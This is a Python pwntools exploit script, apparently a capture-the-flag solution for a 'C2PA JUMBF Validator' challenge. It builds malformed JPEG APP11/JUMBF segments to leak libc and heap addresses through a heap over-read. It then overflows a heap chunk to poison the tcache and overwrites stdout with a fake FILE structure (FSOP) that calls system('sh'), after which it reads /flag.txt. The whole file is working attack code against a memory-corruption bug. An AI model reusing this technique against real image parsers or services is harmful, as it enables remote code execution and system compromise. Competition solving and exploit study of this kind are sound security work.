#!/usr/bin/env python3
"""
GreyCTF 2026 — Content Corrupted (dbench_jumbf)
Heap over-read for libc/heap leak + heap overflow for tcache poisoning → FSOP on stdout.
"""
from pwn import *
import struct
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
DIST = ROOT / "dist"

context.binary = exe = ELF(str(DIST / "server"))

REMOTE_HOST = "localhost"
REMOTE_PORT = 32167

gdbscript = """
b main
c
"""


def conn():
    if args.REMOTE:
        return remote(args.HOST or REMOTE_HOST, int(args.PORT or REMOTE_PORT))
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    return process([exe.path])


# ── Constants ────────────────────────────────────────────────────────────────

UUID_JSON = bytes([0x6A,0x73,0x6F,0x6E,0x00,0x11,0x00,0x10,
                   0x80,0x00,0x00,0xAA,0x00,0x38,0x9B,0x71])
TBOX_JUMB = 0x6a756d62
TBOX_JUMD = 0x6a756d64
TBOX_JSON = 0x6a736f6e

UNSORTED_BIN_OFFSET = 0x1e5b20
STDOUT_OFF = 0x1e65c0
WFILE_JUMPS_OFF = 0x1e4228
SYSTEM_OFF = 0x53110

S_REQ = 0xf8     # overflow source: chunk 0x100
T_REQ = 0x268    # overflow target: chunk 0x270


# ── Helpers ──────────────────────────────────────────────────────────────────

def p32be(x):
    return struct.pack(">I", x & 0xFFFFFFFF)

def p16be(x):
    return struct.pack(">H", x & 0xFFFF)

def send_jpeg(io, data: bytes):
    io.sendlineafter(b"jpeg size> ", str(len(data)).encode())
    io.sendafter(b"jpeg hex> ", data.hex().encode())

def make_app11_multi(jumb_data, en=1):
    lbox = struct.unpack(">I", jumb_data[0:4])[0]
    box_header_size = 16 if lbox == 1 else 8
    jumb_header = jumb_data[:box_header_size]
    jumb_payload = jumb_data[box_header_size:]
    app11_header_size = 10 + box_header_size
    max_payload = 65535 - app11_header_size
    segments = b""
    offset = 0
    z = 1
    while offset < len(jumb_payload):
        chunk = jumb_payload[offset:offset + max_payload]
        le = app11_header_size + len(chunk)
        segments += b"\xff\xeb" + p16be(le) + p16be(0x4A50) + p16be(en) + p32be(z)
        segments += jumb_header + chunk
        offset += len(chunk)
        z += 1
    return segments

def make_jpeg(app11_segments):
    return b"\xff\xd8" + app11_segments + b"\xff\xda\x00\x02"

def make_raw_jumb(size, fill=b"\x41"):
    jumd = p32be(25) + p32be(TBOX_JUMD) + UUID_JSON + b"\x00"
    content_size = size - 8 - 25
    content = p32be(0) + p32be(TBOX_JSON) + fill * (content_size - 8)
    return p32be(size) + p32be(TBOX_JUMB) + jumd + content


# ── Stage 1: Libc leak ──────────────────────────────────────────��────────────

def do_libc_leak(io):
    big_jpeg = b"\xff\xd8\xff\xe0" + p16be(0x4F8) + b"B" * 0x4F6 + b"\xff\xda\x00\x02"
    big_jpeg = big_jpeg[:0x500]
    send_jpeg(io, big_jpeg)
    io.recvuntil(b"done\n")

    app11_len = 0x200 + 10
    jumd = p32be(25) + p32be(TBOX_JUMD) + UUID_JSON + b"\x00"
    content_hdr = p32be(0) + p32be(TBOX_JSON)
    jpeg = b"\xff\xd8\xff\xeb" + p16be(app11_len) + p16be(0x4A50) + p16be(1)
    jpeg += p32be(1) + p32be(0x200) + p32be(TBOX_JUMB) + jumd + content_hdr
    send_jpeg(io, jpeg)
    io.recvuntil(b"Data         : ")
    leaked = io.recv(256)
    io.recvuntil(b"done\n")

    ptr = int.from_bytes(leaked[9:15], "little")
    libc_base = ptr - UNSORTED_BIN_OFFSET
    assert libc_base & 0xfff == 0
    return libc_base


# ── Stage 2: Heap key leak ───────────────────────────────────────────────────

def do_heap_leak(io):
    app11_len = 0x400 + 10
    jumd = p32be(25) + p32be(TBOX_JUMD) + UUID_JSON + b"\x00"
    content_hdr = p32be(0) + p32be(TBOX_JSON)
    jpeg = b"\xff\xd8\xff\xeb" + p16be(app11_len) + p16be(0x4A50) + p16be(1)
    jpeg += p32be(1) + p32be(0x400) + p32be(TBOX_JUMB) + jumd + content_hdr
    send_jpeg(io, jpeg)
    io.recvuntil(b"Data         : ")
    leaked = io.recv(256)
    io.recvuntil(b"done\n")
    heap_key = int.from_bytes(leaked[9:17], "little")
    return heap_key


# ── Stage 3: Setup adjacent freed chunks ─────────────────────────────────────

def do_setup(io):
    jumb_textra = make_raw_jumb(T_REQ, b"E")
    jumb_s = make_raw_jumb(S_REQ, b"S")
    jumb_t = make_raw_jumb(T_REQ, b"T")
    app11 = make_app11_multi(jumb_textra, en=1)
    app11 += make_app11_multi(jumb_s, en=2)
    app11 += make_app11_multi(jumb_t, en=3)
    send_jpeg(io, make_jpeg(app11))
    io.recvuntil(b"done\n")


# ── Stage 4: Overflow + FSOP ─────────────────────────────────────────────────

def do_attack(io, libc_base, t_key):
    stdout_addr = libc_base + STDOUT_OFF
    system_addr = libc_base + SYSTEM_OFF
    wfile_jumps = libc_base + WFILE_JUMPS_OFF
    target = stdout_addr - 0x10  # 16-byte aligned, Lbox+Tbox junk lands before _flags

    chunk_t = (T_REQ + 8 + 15) & ~15  # = 0x270
    poisoned_fd = target ^ t_key

    # ── FSOP payload (0x250 bytes, written to stdout+0 after 16-byte prefix) ──
    fsop = bytearray(0x250)
    def w64(off, val):
        struct.pack_into("<Q", fsop, off, val)

    # _flags: "  sh\x00" — system("  sh") runs sh
    struct.pack_into("<I", fsop, 0x00, 0x68732020)
    # _IO_write_ptr != 0: triggers overflow path
    w64(0x28, 1)
    # _lock: point to zeroed area within our controlled region
    w64(0x88, stdout_addr + 0x150)
    # _wide_data → fake wide data at stdout+0xE0
    w64(0xa0, stdout_addr + 0xE0)
    # vtable → _IO_wfile_jumps (passes glibc vtable range check)
    w64(0xd8, wfile_jumps)
    # Fake _IO_wide_data at +0xE0:
    #   _IO_write_base (+0x18) = 0 (triggers alloc path)
    #   _IO_buf_base (+0x30) = 0 (triggers vtable call)
    #   _wide_vtable (+0xE0) → fake vtable at stdout+0x1C8
    w64(0xE0 + 0xE0, stdout_addr + 0x1C8)
    # Fake _wide_vtable at +0x1C8:
    #   __doallocate (+0x68) = system → called with rdi=fp → system("  sh")
    w64(0x1C8 + 0x68, system_addr)

    # ── Box A (En=1): Overflow S → poison T's fd ──
    overflow = p32be(S_REQ) + p32be(TBOX_JUMB)
    overflow += b"X" * (0xF0 - 8)       # fill S user area
    overflow += p64(0)                   # T prev_size
    overflow += p64(chunk_t | 1)         # T size (preserve)
    overflow += p64(poisoned_fd)         # T fd → (stdout - 0x10)
    seg_a_len = len(overflow) + 10
    seg_a = b"\xff\xeb" + p16be(seg_a_len) + p16be(0x4A50) + p16be(1) + p32be(1) + overflow

    # ── Box B (En=2): Drain T from tcache ──
    seg_b = make_app11_multi(make_raw_jumb(T_REQ, b"B"), en=2)

    # ── Box C (En=3): Gets (stdout-0x10), writes [16 junk + FSOP] ──
    seg_c_data = p32be(T_REQ) + p32be(TBOX_JUMB) + b"\x00" * 8 + bytes(fsop)
    seg_c_len = len(seg_c_data) + 10
    seg_c = b"\xff\xeb" + p16be(seg_c_len) + p16be(0x4A50) + p16be(3) + p32be(1) + seg_c_data

    # Assemble JPEG (pad to avoid tcache interference for the jpeg alloc)
    attack_jpeg = b"\xff\xd8" + seg_a + seg_b + seg_c
    if len(attack_jpeg) < 0x500:
        attack_jpeg += b"\x00" * (0x500 - len(attack_jpeg))

    io.sendlineafter(b"jpeg size> ", str(len(attack_jpeg)).encode())
    io.sendafter(b"jpeg hex> ", attack_jpeg.hex().encode())


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    io = conn()
    io.recvuntil(b"=== C2PA JUMBF Validator ===\n")

    # Stage 1: libc leak
    libc_base = do_libc_leak(io)
    log.success(f"libc base: {libc_base:#x}")

    # Stage 2: heap key leak
    heap_key = do_heap_leak(io)
    t_key = heap_key + 1  # T is one page further (consistent +1 offset)
    log.success(f"heap key: {heap_key:#x} → T key: {t_key:#x}")

    # Stage 3: setup adjacent S + T chunks
    do_setup(io)
    log.info("setup done: T_extra + S + T freed")

    # Stage 4: overflow → tcache poison → FSOP
    do_attack(io, libc_base, t_key)
    log.success("attack sent — FSOP triggered")

    # Shell!
    sleep(0.3)
    io.sendline(b"cat /flag.txt")
    io.interactive()


if __name__ == "__main__":
    main()
